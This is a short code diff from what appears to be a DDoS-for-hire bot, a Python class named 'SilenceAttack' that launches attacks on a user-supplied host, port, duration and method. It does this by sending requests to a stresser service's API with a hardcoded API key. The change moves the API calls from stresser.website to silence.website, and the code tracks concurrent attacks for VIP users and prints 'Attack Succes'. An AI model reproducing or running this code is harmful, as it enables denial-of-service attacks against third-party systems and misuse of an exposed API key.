@@ -70,7 +70,7 @@ class SilenceAttack:
                         if vip == "True":
                             database['Concurrent'] = conc + 1
                             database['time'] = times + time
-                            requests.get(f'https://stresser.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
+                            requests.get(f'https://silence.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
                             print('[>} Attack Succes :)')
 
                             
@@ -84,7 +84,7 @@ class SilenceAttack:
                         database['Concurrent'] = conc + 1
                         database['time'] = times + time
 
-                        requests.get(f'https://stresser.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
+                        requests.get(f'https://silence.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
                         print('[>} Attack Succes :)')
 
         else:
